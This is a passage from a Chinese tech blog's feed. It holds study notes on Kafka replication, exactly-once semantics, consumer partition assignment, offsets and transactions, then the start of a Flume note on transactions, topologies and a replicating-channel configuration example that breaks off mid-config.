alt="1637307411343"></p><p>LEO：指的是每个副本最大的offset；</p><p>HW：指的是消费者能见到的最大的offset，ISR队列中最小的LEO。</p><p>（1）follower故障</p><p>follower发生故障后会被临时踢出ISR，待该follower恢复后，follower会读取本地磁盘记录的上次的HW，并将log文件高于HW的部分截取掉，从HW开始向leader进行同步。等该follower的LEO大于等于该Partition的HW，即follower追上leader之后，就可以重新加入ISR了。</p><p>（2）leader故障</p><p>leader发生故障之后，会从ISR中选出一个新的leader，之后，为保证多个副本之间的数据一致性，其余的follower会先将各自的log文件高于HW的部分截掉，然后从新的leader同步数据。</p><p>注意：这只能保证副本之间的数据一致性，并不能保证数据不丢失或者不重复。</p><h3 id="2-3-Exactly-Once语义"><a href="#2-3-Exactly-Once语义" class="headerlink" title="2.3 Exactly Once语义"></a>2.3 Exactly Once语义</h3><p>​    将服务器的ACK级别设置为-1，可以保证Producer到Server之间不会丢失数据，即At Least Once语义。相对的，将服务器ACK级别设置为0，可以保证生产者每条消息只会被发送一次，即At Most Once语义。</p><p>​    At Least Once可以保证数据不丢失，但是不能保证数据不重复；相对的，At Least Once可以保证数据不重复，但是不能保证数据不丢失。但是，对于一些非常重要的信息，比如说交易数据，下游数据消费者要求数据既不重复也不丢失，即Exactly Once语义。在0.11版本以前的Kafka，对此是无能为力的，只能保证数据不丢失，再在下游消费者对数据做全局去重。对于多个下游应用的情况，每个都需要单独做全局去重，这就对性能造成了很大影响。</p><p>0.11版本的Kafka，引入了一项重大特性：幂等性。所谓的幂等性就是指Producer不论向Server发送多少次重复数据，Server端都只会持久化一条。幂等性结合At Least Once语义，就构成了Kafka的Exactly Once语义。即：At Least Once + 幂等性 = Exactly Once</p><p>​    要启用幂等性，只需要将Producer的参数中enable.idempotence设置为true即可。Kafka的幂等性实现其实就是将原来下游需要做的去重放在了数据上游。开启幂等性的Producer在初始化的时候会被分配一个PID，发往同一Partition的消息会附带Sequence Number。而Broker端会对&lt;PID, Partition, SeqNumber&gt;做缓存，当具有相同主键的消息提交时，Broker只会持久化一条。</p><p>但是PID重启就会变化，同时不同的Partition也具有不同主键，所以幂等性无法保证跨分区跨会话的Exactly Once。</p><h2 id="3-Kafka消费者"><a href="#3-Kafka消费者" class="headerlink" title="3 Kafka消费者"></a>3 Kafka消费者</h2><h3 id="3-1-消费方式"><a href="#3-1-消费方式" class="headerlink" title="3.1 消费方式"></a>3.1 消费方式</h3><p>consumer采用pull（拉）模式从broker中读取数据。</p><p>push（推）模式很难适应消费速率不同的消费者，因为消息发送速率是由broker决定的。它的目标是尽可能以最快速度传递消息，但是这样很容易造成consumer来不及处理消息，典型的表现就是拒绝服务以及网络拥塞。而pull模式则可以根据consumer的消费能力以适当的速率消费消息。</p><p>pull模式不足之处是，如果kafka没有数据，消费者可能会陷入循环中，一直返回空数据。针对这一点，Kafka的消费者在消费数据时会传入一个时长参数timeout，如果当前没有数据可供消费，consumer会等待一段时间之后再返回，这段时长即为timeout。</p><h3 id="3-2-分区分配策略"><a href="#3-2-分区分配策略" class="headerlink" title="3.2 分区分配策略"></a>3.2 分区分配策略</h3><p>一个consumer group中有多个consumer，一个 topic有多个partition，所以必然会涉及到partition的分配问题，即确定那个partition由哪个consumer来消费。</p><p>Kafka有三种分配策略，RoundRobin，Range , Sticky。</p><p>1）RoundRobin</p><p>RoundRobinAssignor策略的原理是将消费组内所有消费者以及消费者所订阅的所有topic的partition按照字典序排序，然后通过轮询方式逐个将分区以此分配给每个消费者。<br>如果同一个消费组内所有的消费者的订阅信息都是相同的，那么RoundRobinAssignor策略的分区分配会是均匀的。举例，假设消费组中有2个消费者C0和C1，都订阅了主题t0和t1，并且每个主题都有3个分区，那么所订阅的所有分区可以标识为：t0p0、t0p1、t0p2、t1p0、t1p1、t1p2。最终的分配结果为：<br>消费者C0：t0p0、t0p2、t1p1<br>消费者C1：t0p1、t1p0、t1p2<br>如果同一个消费组内的消费者所订阅的信息是不相同的，那么在执行分区分配的时候就不是完全的轮询分配，有可能会导致分区分配的不均匀。如果某个消费者没有订阅消费组内的某个topic，那么在分配分区的时候此消费者将分配不到这个topic的任何分区。<br>举例，假设消费组内有3个消费者C0、C1和C2，它们共订阅了3个主题：t0、t1、t2，这3个主题分别有1、2、3个分区，即整个消费组订阅了t0p0、t1p0、t1p1、t2p0、t2p1、t2p2这6个分区。具体而言，消费者C0订阅的是主题t0，消费者C1订阅的是主题t0和t1，消费者C2订阅的是主题t0、t1和t2，那么最终的分配结果为：<br>消费者C0：t0p0<br>消费者C1：t1p0<br>消费者C2：t1p1、t2p0、t2p1、t2p2 </p><p>2）Range 默认的</p><p>RangeAssignor策略的原理是按照消费者总数和分区总数进行整除运算来获得一个跨度，然后将分区按照跨度进行平均分配，以保证分区尽可能均匀地分配给所有的消费者。对于每一个topic，RangeAssignor策略会将消费组内所有订阅这个topic的消费者按照名称的字典序排序，然后为每个消费者划分固定的分区范围，如果不够平均分配，那么字典序靠前的消费者会被多分配一个分区。</p><p>可以明显的看到这样的分配并不均匀，如果将类似的情形扩大，有可能会出现部分消费者过载的情况。对此我们再来看下另一种RoundRobinAssignor策略的分配效果如何。</p><p>3） StickyAssignor分配策略</p><p>我们再来看一下StickyAssignor策略，“sticky”这个单词可以翻译为“粘性的”，Kafka从0.11.x版本开始引入这种分配策略，它主要有两个目的：<br>分区的分配要尽可能的均匀；<br>分区的分配尽可能的与上次分配的保持相同。<br>当两者发生冲突时，第一个目标优先于第二个目标。鉴于这两个目标，StickyAssignor策略的具体实现要比RangeAssignor和RoundRobinAssignor这两种分配策略要复杂很多。我们举例来看一下StickyAssignor策略的实际效果。<br>举例，同样消费组内有3个消费者：C0、C1和C2，集群中有3个主题：t0、t1和t2，这3个主题分别有1、2、3个分区，也就是说集群中有t0p0、t1p0、t1p1、t2p0、t2p1、t2p2这6个分区。消费者C0订阅了主题t0，消费者C1订阅了主题t0和t1，消费者C2订阅了主题t0、t1和t2。<br>消费者C0：t0p0<br>消费者C1：t1p0、t1p1<br>消费者C2：t2p0、t2p1、t2p2<br>可以看到这是一个最优解（消费者C0没有订阅主题t1和t2，所以不能分配主题t1和t2中的任何分区给它，对于消费者C1也可同理推断）。<br>假如此时消费者C0脱离了消费组，那么RoundRobinAssignor策略的分配结果为：<br>消费者C1：t0p0、t1p1<br>消费者C2：t1p0、t2p0、t2p1、t2p2<br>可以看到RoundRobinAssignor策略保留了消费者C1和C2中原有的3个分区的分配：t2p0、t2p1和t2p2（针对结果集1）。而如果采用的是StickyAssignor策略，那么分配<br>消费者C1：t1p0、t1p1、t0p0<br>消费者C2：t2p0、t2p1、t2p2<br>可以看到StickyAssignor策略保留了消费者C1和C2中原有的5个分区的分配：t1p0、t1p1、t2p0、t2p1、t2p2。<br>从结果上看StickyAssignor策略比另外两者分配策略而言显得更加的优异，这个策略的代码实现也是异常复杂，如果读者没有接触过这种分配策略，不妨使用一下来尝尝鲜。</p><p>1.同一个Consumer Group内新增或减少Consumer<br>2.Topic分区发生变化</p><h3 id="3-3-offset的维护"><a href="#3-3-offset的维护" class="headerlink" title="3.3 offset的维护"></a>3.3 offset的维护</h3><p>由于consumer在消费过程中可能会出现断电宕机等故障，consumer恢复后，需要从故障前的位置的继续消费，所以consumer需要实时记录自己消费到了哪个offset，以便故障恢复后继续消费。</p><p>Kafka 0.9版本之前，consumer默认将offset保存在Zookeeper中，从0.9版本开始，consumer默认将offset保存在Kafka一个内置的topic中，该topic为__consumer_offsets。</p><p>1）消费offset案例</p><p>（0）思想: __consumer_offsets 为kafka中的topic， 那就可以通过消费者进行消费.</p><p>（1）修改配置文件consumer.properties</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 不排除内部的topic</span>exclude.internal.topics<span class="token operator">=</span>false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（2）创建一个topic</p><pre class="line-numbers language-bash"><code class="language-bash">bin/kafka-topics.sh --create --topic molly --zookeeper hadoop102:2181 --partitions 2 --replication-factor 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（3）启动生产者和消费者，分别往molly生产数据和消费数据</p><pre class="line-numbers language-bash"><code class="language-bash">bin/kafka-console-producer.sh --topic molly --broker-list hadoop102:9092bin/kafka-console-consumer.sh --consumer.config config/consumer.properties --topic molly --bootstrap-server hadoop102:9092<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（4）消费offset</p><pre class="line-numbers language-bash"><code class="language-bash">bin/kafka-console-consumer.sh --topic __consumer_offsets --bootstrap-server  hadoop102:9092 --formatter <span class="token string">"kafka.coordinator.group.GroupMetadataManager\<span class="token variable">$OffsetsMessageFormatter</span>"</span> --consumer.config config/consumer.properties --from-beginning<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（5）消费到的数据</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>test-consumer-group,molly,1<span class="token punctuation">]</span>::OffsetAndMetadata<span class="token punctuation">(</span>offset<span class="token operator">=</span>2, leaderEpoch<span class="token operator">=</span>Optional<span class="token punctuation">[</span>0<span class="token punctuation">]</span>, metadata<span class="token operator">=</span>, commitTimestamp<span class="token operator">=</span>1591935656078, expireTimestamp<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">[</span>test-consumer-group,molly,0<span class="token punctuation">]</span>::OffsetAndMetadata<span class="token punctuation">(</span>offset<span class="token operator">=</span>1, leaderEpoch<span class="token operator">=</span>Optional<span class="token punctuation">[</span>0<span class="token punctuation">]</span>, metadata<span class="token operator">=</span>, commitTimestamp<span class="token operator">=</span>1591935656078, expireTimestamp<span class="token operator">=</span>None<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3-4-消费者组案例"><a href="#3-4-消费者组案例" class="headerlink" title="3.4 消费者组案例"></a>3.4 消费者组案例</h3><p>1）需求：测试同一个消费者组中的消费者，同一时刻只能有一个消费者消费。</p><p>2）案例实操</p><p>​    （1）在hadoop102、hadoop103上修改/opt/module/kafka/config/consumer.properties配置文件中的group.id属性为任意组名。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop103 config<span class="token punctuation">]</span>$ <span class="token function">vi</span> consumer.propertiesgroup.id<span class="token operator">=</span>mygroup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​    （2）在hadoop104上启动生产者</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span> molly hadoop104 kafka<span class="token punctuation">]</span>$ bin/kafka-console-producer.sh \--broker-list hadoop102:9092 --topic first<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​     （3）在hadoop102、hadoop103上分别启动消费者</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly hadoop104 kafka<span class="token punctuation">]</span>$ bin/kafka-console-consumer.sh \bootstrap-server hadoop102:9092 --topic first --consumer.config config/consumer.properties<span class="token punctuation">[</span>molly hadoop104 kafka<span class="token punctuation">]</span>$ bin/kafka-console-consumer.sh --bootstrap-server hadoop102:9092 --topic first --consumer.config config/consumer.properties<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    （4）查看hadoop102和hadoop103的消费者的消费情况。</p><h2 id="4-Kafka-高效读写数据"><a href="#4-Kafka-高效读写数据" class="headerlink" title="4 Kafka 高效读写数据"></a>4 Kafka 高效读写数据</h2><p>1）顺序写磁盘</p><p>Kafka的producer生产数据，要写入到log文件中，写的过程是一直追加到文件末端，为顺序写。官网有数据表明，同样的磁盘，顺序写能到600M/s，而随机写只有100K/s。这与磁盘的机械机构有关，顺序写之所以快，是因为其省去了大量磁头寻址的时间。</p><p>2）应用 </p><p>Kafka数据持久化是直接持久化到Pagecache中，这样会产生以下几个好处： </p><p>Ø I/O Scheduler 会将连续的小块写组装成大块的物理写从而提高性能</p><p>Ø I/O Scheduler 会尝试将一些写操作重新按顺序排好，从而减少磁盘头的移动时间</p><p>Ø 充分利用所有空闲内存（非 JVM 内存）。如果使用应用层 Cache（即 JVM 堆内存），会增加 GC 负担</p><p>Ø 读操作可直接在 Page Cache 内进行。如果消费和生产速度相当，甚至不需要通过物理磁盘（直接通过 Page Cache）交换数据</p><p>Ø 如果进程重启，JVM 内的 Cache 会失效，但 Page Cache 仍然可用</p><p>尽管持久化到Pagecache上可能会造成宕机丢失数据的情况，但这可以被Kafka的Replication机制解决。如果为了保证这种情况下数据不丢失而强制将 Page Cache 中的数据 Flush 到磁盘，反而会降低性能。</p><p>3）零复制技术</p><p>  <img src="/2020/11/16/bigdata-kafka2-framework/1637307730229.png" alt="1637307730229"></p><h2 id="5-Zookeeper在Kafka中的作用"><a href="#5-Zookeeper在Kafka中的作用" class="headerlink" title="5 Zookeeper在Kafka中的作用"></a>5 Zookeeper在Kafka中的作用</h2><p>Kafka集群中有一个broker会被选举为Controller，负责管理集群broker的上下线，所有topic的分区副本分配和leader选举等工作。</p><p>Controller的管理工作都是依赖于Zookeeper的。</p><p>​    以下为partition的leader选举过程：</p><p> <img src="/2020/11/16/bigdata-kafka2-framework/1637307712652.png" alt="1637307712652"></p><h2 id="6-Kafka事务"><a href="#6-Kafka事务" class="headerlink" title="6 Kafka事务"></a>6 Kafka事务</h2><p>Kafka从0.11版本开始引入了事务支持。事务可以保证Kafka在Exactly Once语义的基础上，生产和消费可以跨分区和会话，要么`全部成功，要么全部失败。</p><h3 id="6-1-Producer事务"><a href="#6-1-Producer事务" class="headerlink" title="6.1 Producer事务"></a>6.1 Producer事务</h3><p>为了实现跨分区跨会话的事务，需要引入一个全局唯一的Transaction ID，并将Producer获得的PID和Transaction ID绑定。这样当Producer重启后就可以通过正在进行的Transaction ID获得原来的PID。</p><p>为了管理Transaction，Kafka引入了一个新的组件Transaction Coordinator。Producer就是通过和Transaction Coordinator交互获得Transaction ID对应的任务状态。Transaction Coordinator还负责将事务所有写入Kafka的一个内部Topic，这样即使整个服务重启，由于事务状态得到保存，进行中的事务状态可以得到恢复，从而继续进行。</p><h3 id="6-2-Consumer事务（精准一次性消费）"><a href="#6-2-Consumer事务（精准一次性消费）" class="headerlink" title="6.2 Consumer事务（精准一次性消费）"></a>6.2 Consumer事务（精准一次性消费）</h3><p>上述事务机制主要是从Producer方面考虑，对于Consumer而言，事务的保证就会相对较弱，尤其时无法保证Commit的信息被精确消费。这是由于Consumer可以通过offset访问任意信息，而且不同的Segment File生命周期不同，同一事务的消息可能会出现重启后被删除的情况。</p><p>如果想完成Consumer端的精准一次性消费，那么需要kafka消费端将消费过程和提交offset过程做原子绑定。此时我们需要将kafka的offset保存到支持事务的自定义介质（比如mysql）。这部分知识会在后续项目部分涉及。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://baijiahao.baidu.com/s?id=1714208809060474800&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1714208809060474800&amp;wfr=spider&amp;for=pc</a></p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/kafka/">kafka</category>
      
      
      <comments>https://m01ly.github.io/2020/11/16/bigdata-kafka2-framework/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>flume学习笔记（二） flum事务和部署架构解析</title>
      <link>https://m01ly.github.io/2020/11/15/bigdata-flume2-framework/</link>
      <guid>https://m01ly.github.io/2020/11/15/bigdata-flume2-framework/</guid>
      <pubDate>Sun, 15 Nov 2020 08:46:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-Flume事务"><a href="#1-Flume事务" class="headerlink" title="1 Flume事务"></a><strong>1 Flume事务</strong></h2><p>一提到事务，首先就想到的是关系型数据库中的事务，事务一个典型的特征就是将一批操作做成原子性的，要么都成功，要么都失败。</p><p>flume事务就是保证fllume能安全正常的运行，保证服务的可靠性，安全性。</p><p>在Flume中一共有两个事务:</p><ul><li>Put事务：在Source到Channel之间</li><li>Take事务：Channel到Sink之间</li></ul><p>从Source到Channel过程中，数据在Flume中会被封装成Event对象，也就是一批Event，把这批Event放到一个事务中，把这个事务也就是这批event一次性的放入Channel中。同理，Take事务的时候，也是把这一批event组成的事务统一拿出来到sink放到HDFS上。</p><p>事务具体流程如下图所示：</p><p><strong><img src="/2020/11/15/bigdata-flume2-framework/1637064771603.png" alt="1637064771603"></strong></p><h4 id="1-1-Put事务流程"><a href="#1-1-Put事务流程" class="headerlink" title="1.1 Put事务流程"></a>1.1 Put事务流程</h4><ul><li><p>事务开始的时候会调用一个doPut 方法，doPut方法将一批数据放在putList中;</p></li><li><ul><li>putList在向Channel发送数据之前先检查Channel的容量能否放得下，如果放不下一个都不放，只能doRollback;</li><li>数据批的大小取决于配置参数batch size的值;</li><li>putList的大小取决于配置Channel的参数transaction capacity的大小，该参数大小就体现在putList上;(Channel的另一个参数capacity指的是Channel的容量);</li></ul></li><li><p>数据顺利的放到putList之后，Flume中的 Take 事务</p><p>Take事务同样也有takeList，HDFS sink配置有一个batch size，这个参数决定Sink从Channel 取数据的时候一次取多少个，所以该batch size得小于takeList的大小，而takeList的大小取决于 transaction capacity 的大小，同样是channel中的参数。其中putlist，takelist容量可以通过下面配置：a3.channels.c3.transactionCapacity = 100</p></li></ul><h4 id="1-2-Take事务流程"><a href="#1-2-Take事务流程" class="headerlink" title="1.2 Take事务流程:"></a>1.2 Take事务流程:</h4><p>  事务开始后</p><ul><li><p>doTake方法会将channel中的event剪切到takeList中。如果后面接的是HDFS Sink的话，在把Channel中的event剪切到takeList中的同时也往写入HDFS的IO缓冲流中放一份event(数据写入HDFS是先写入IO缓冲流然后flush到HDFS);</p></li><li><p>当takeList中存放了batch size 数量的event之后，就会调用doCommit方法，doCommit方法会做两个操作:</p></li><li><ul><li>针对HDFS Sink，手动调用IO流的flush方法，将IO流缓冲区的数据写入到HDFS磁盘中;</li><li>清空takeList中的数据</li></ul><p>flush到HDFS的时候组容易出问题。flush到HDFS的时候，可能由于网络原因超时导致数据传输失败，这个时候调用doRollback方法来进行回滚，回滚的时候由于takeList中还有备份数据，所以将takeList中的数据原封不动地还给channel，这时候就完成了事务的回滚。</p><p>但是，如果flush到HDFS的时候，数据flush了一半之后出问题了，这意味着已经有一半的数据已经发送到HDFS上面了，现在出了问题，同样需要调用doRollback方法来进行回滚，回滚并没有“一半”之说，它只会把整个takeList中的数据返回给 channel，然后继续进行数据的读写。这样开启下一个事务的时候容易造成数据重复的问题。接下来可以调用doCommit方法，把putList中所有的Event放到 Channel 中，成功放完之后就清空putList;</p></li></ul><p>在doCommit提交之后，事务在向Channel存放数据的过程中，事务容易出问题。如Sink取数据慢，而Source放数据速度快，容易造成Channel中数据的积压，如果putList中的数据放不进去，会如何呢?</p><p>此时会调用 doRollback 方法，doRollback方法会进行两项操作：将putList清空; 抛出 ChannelException异常。source会捕捉到doRollback抛出的异常，然后source就将刚才的一批数据重新采集，然后重新开始一个新的事务，这就是事务的回滚。</p><h2 id="2-Flume-Agent内部原理"><a href="#2-Flume-Agent内部原理" class="headerlink" title="2 Flume Agent内部原理"></a>2 Flume Agent内部原理</h2><p><img src="/2020/11/15/bigdata-flume2-framework/1637065765693.png" alt="1637065765693"></p><p>重要组件：</p><p>1）ChannelSelector</p><p>ChannelSelector的作用就是选出Event将要被发往哪个Channel。其共有两种类型，分别是Replicating（复制）和Multiplexing（多路复用）。</p><p>ReplicatingSelector会将同一个Event发往所有的Channel，Multiplexing会根据相应的原则，将不同的Event发往不同的Channel。</p><p>2）SinkProcessor</p><p>SinkProcessor共有三种类型，分别是DefaultSinkProcessor、LoadBalancingSinkProcessor和FailoverSinkProcessor</p><p>DefaultSinkProcessor对应的是单个的Sink，LoadBalancingSinkProcessor和FailoverSinkProcessor对应的是Sink Group，</p><p>LoadBalancingSinkProcessor可以实现负载均衡的功能：利用一定算法将channel均衡的分配到sink上；</p><p>FailoverSinkProcessor可以错误恢复的功能：三个中只有一个是Active的sink,如果当前acticve的sink故障了，另外两台通过选举的方式上位，成为新的sink（选举的指标是配置文件中a1.sinkgroups.g1.processor.priority.k1）。</p><h2 id="3-Flume拓扑结构"><a href="#3-Flume拓扑结构" class="headerlink" title="3 Flume拓扑结构"></a>3 Flume拓扑结构</h2><p>在实际应用中，根据不同的场景，可能部署多个flume实现功能，很多个flume使用的搭配结果如下：</p><h3 id="3-1-简单串联"><a href="#3-1-简单串联" class="headerlink" title="3.1 简单串联"></a>3.1 简单串联</h3><p><strong><img src="/2020/11/15/bigdata-flume2-framework/clip_image002.jpg" alt="img"></strong></p><p>这种模式是将多个flume顺序连接起来了，从最初的source开始到最终sink传送的目的存储系统。此模式不建议桥接过多的flume数量， flume数量过多不仅会影响传输速率，而且一旦传输过程中某个节点flume宕机，会影响整个传输系统。</p><h3 id="3-2-复制和多路复用"><a href="#3-2-复制和多路复用" class="headerlink" title="3.2 复制和多路复用"></a><strong>3.2 复制和多路复用</strong></h3><p><strong><img src="/2020/11/15/bigdata-flume2-framework/clip_image004.jpg" alt="img"></strong></p><p>Flume支持将事件流向一个或者多个目的地。这种模式可以将相同数据复制到多个channel中，或者将不同数据分发到不同的channel中，sink可以选择传送到不同的目的地。</p><h3 id="3-3-负载均衡和故障转移"><a href="#3-3-负载均衡和故障转移" class="headerlink" title="3.3 负载均衡和故障转移"></a><strong>3.3 负载均衡和故障转移</strong></h3><p><strong><img src="/2020/11/15/bigdata-flume2-framework/clip_image006.jpg" alt="img"></strong></p><hr><p>Flume支持使用将多个sink逻辑上分到一个sink组，sink组配合不同的SinkProcessor可以实现负载均衡和错误恢复的功能。</p><h3 id="3-4-聚合"><a href="#3-4-聚合" class="headerlink" title="3.4 聚合"></a><strong>3.4 聚合</strong></h3><p><strong><img src="/2020/11/15/bigdata-flume2-framework/clip_image008.jpg" alt="img"></strong></p><p>这种模式是我们最常见的，也非常实用，日常web应用通常分布在上百个服务器，大者甚至上千个、上万个服务器。产生的日志，处理起来也非常麻烦。用flume的这种组合方式能很好的解决这一问题，每台服务器部署一个flume采集日志，传送到一个集中收集日志的flume，再由此flume上传到hdfs、hive、hbase等，进行日志分析。</p><h2 id="4-Flume开发案例"><a href="#4-Flume开发案例" class="headerlink" title="4 Flume开发案例"></a><strong>4 Flume开发案例</strong></h2><h3 id="4-1-复制"><a href="#4-1-复制" class="headerlink" title="4.1 复制"></a>4.1 复制</h3><p><strong>1）案例需求</strong></p><p>使用Flume-1监控文件变动，Flume-1将变动内容传递给Flume-2，Flume-2负责存储到HDFS。同时Flume-1将变动内容传递给Flume-3，Flume-3负责输出到Local FileSystem。</p><p><strong>2）需求分析：</strong></p><p><strong><img src="/2020/11/15/bigdata-flume2-framework/clip_image002.png" alt="img"></strong></p><p>具体类型选择如下图所示：</p><p><strong><img src="/2020/11/15/bigdata-flume2-framework/1637066888396.png" alt="1637066888396"></strong></p><p>3）实现步骤：</p><p>（1）准备工作</p><p>在/opt/module/flume/job目录下创建group1文件夹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 job<span class="token punctuation">]</span>$ <span class="token function">cd</span> group1/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在/opt/module/datas/目录下创建flume3文件夹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 datas<span class="token punctuation">]</span>$ <span class="token function">mkdir</span> flume3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）创建flume-file-flume.conf</p><p>配置1个接收日志文件的source和两个channel、两个sink，分别输送给flume-flume-hdfs和flume-flume-dir。</p><p>编辑配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 group1<span class="token punctuation">]</span>$ vim flume-file-flume.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加如下内容</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Name the components on this agent</span>a1.sources <span class="token operator">=</span> r1a1.sinks <span class="token operator">=</span> k1 k2a1.channels <span class="token operator">=</span> c1 c2<span class="token comment" spellcheck="true"># 将数据流复制给所有channel</span>a1.sources.r1.selector.type <span class="token operator">=</span> replicating<span class="token comment" spellcheck="true"># Describe/configure the source</span>a1.sources.r1.type <span class="token operator">=</span> <span class="token function">exec</span>a1.sources.r1.command <span class="token operator">=</span> <span class="token function">tail</span> -F /opt/module/hive/logs/hive.loga1.sources.r1.shell <span class="token operator">=</span> /bin/bash -c<span class="token comment" spellcheck="true"># Describe the sink</span><span class="token comment" spellcheck="true"># sink端的avro是一个数据发送者</span>a1.sinks.k1.type <span class="token operator">=</span> avroa1.sinks.k1.hostname <span class="token operator">=</span> hadoop102 a1.sinks.k1.port <span class="token operator">=</span> 4141a1.sinks.k2.type <span class="token operator">=</span> avroa1.sinks.k2.hostname <span class="token operator">=</span> hadoop102a1.sinks.k2.port <span class="token operator">=</span> 4142<span class="token comment" spellcheck="true"># Describe the channel</span>a1.channels.c1.type <span class="token operator">=</span> memorya1.channels.c1.capacity <span class="token operator">=</span> 1000a1.channels.c1.transactionCapacity <span class="token operator">=</span> 100a1.channels.c2.type <span class="token operator">=</span> memorya1.channels.c2.capacity <span class="token operator">=</span> 1000a1.channels.c2.transactionCapacity <span class="token operator">=</span> 100<span class="token comment" spellcheck="true"># Bind the source and sink to the channel</span>a1.sources.r1.channels <span class="token operator">=</span> c1 c2a1.sinks.k1.channel <span class="token operator">=</span> c1a1.sinks.k2.channel <span class="token operator">=</span> c2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）创建flume-flume-hdfs.conf</p><p>配置上级Flume输出的Source，输出是到HDFS的Sink。</p><p>编辑配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 group1<span class="token punctuation">]</span>$ vim flume-flume-hdfs.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加如下内容</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Name the components on this agent</span>a2.sources <span class="token operator">=</span> r1a2.sinks <span class="token operator">=</span> k1a2.channels <span class="token operator">=</span> c1<span class="token comment" spellcheck="true"># Describe/configure the source</span><span class="token comment" spellcheck="true"># source端的avro是一个数据接收服务</span>a2.sources.r1.type <span class="token operator">=</span> avroa2.sources.r1.bind <span class="token operator">=</span> hadoop102a2.sources.r1.port <span class="token operator">=</span> 4141<span class="token comment" spellcheck="true"># Describe the sink</span>a2.sinks.k1.type <span class="token operator">=</span> hdfsa2.sinks.k1.hdfs.path <span class="token operator">=</span> hdfs://hadoop102:8020/flume2/%Y%m%d/%H<span class="token comment" spellcheck="true">#上传文件的前缀</span>a2.sinks.k1.hdfs.filePrefix <span class="token operator">=</span> flume2-<span class="token comment" spellcheck="true">#是否按照时间滚动文件夹</span>a2.sinks.k1.hdfs.round <span class="token operator">=</span> <span class="token boolean">true</span><span class="token comment" spellcheck="true">#多少时间单位创建一个新的文件夹</span>a2.sinks.k1.hdfs.roundValue <span class="token operator">=</span> 1<span class="token comment" spellcheck="true">#重新定义时间单位</span>a2.sinks.k1.hdfs.roundUnit <span class="token operator">=</span> hour<span class="token comment" spellcheck="true">#是否使用本地时间戳</span>a2.sinks.k1.hdfs.useLocalTimeStamp <span class="token operator">=</span> <span class="token boolean">true</span><span class="token comment" spellcheck="true">#积攒多少个Event才flush到HDFS一次</span>a2.sinks.k1.hdfs.batchSize <span class="token operator">=</span> 100<span class="token comment" spellcheck="true">#设置文件类型，可支持压缩</span>a2.sinks.k1.hdfs.fileType <span class="token operator">=</span> DataStream<span class="token comment" spellcheck="true">#多久生成一个新的文件</span>a2.sinks.k1.hdfs.rollInterval <span class="token operator">=</span> 600<span class="token comment" spellcheck="true">#设置每个文件的滚动大小大概是128M</span>a2.sinks.k1.hdfs.rollSize <span class="token operator">=</span> 134217700<span class="token comment" spellcheck="true">#文件的滚动与Event数量无关</span>a2.sinks.k1.hdfs.rollCount <span class="token operator">=</span> 0<span class="token comment" spellcheck="true"># Describe the channel</span>a2.channels.c1.type <span class="token operator">=</span> memorya2.channels.c1.capacity <span class="token operator">=</span> 1000a2.channels.c1.transactionCapacity <span class="token operator">=</span> 100<span class="token comment" spellcheck="true"># Bind the source and sink to the channel</span>a2.sources.r1.channels <span class="token operator">=</span> c1a2.sinks.k1.channel <span class="token operator">=</span> c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（4）创建flume-flume-dir.conf</p><p>配置上级Flume输出的Source，输出是到本地目录的Sink。</p><p>编辑配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 group1<span class="token punctuation">]</span>$ vim flume-flume-dir.conf<span aria-hidden="true" 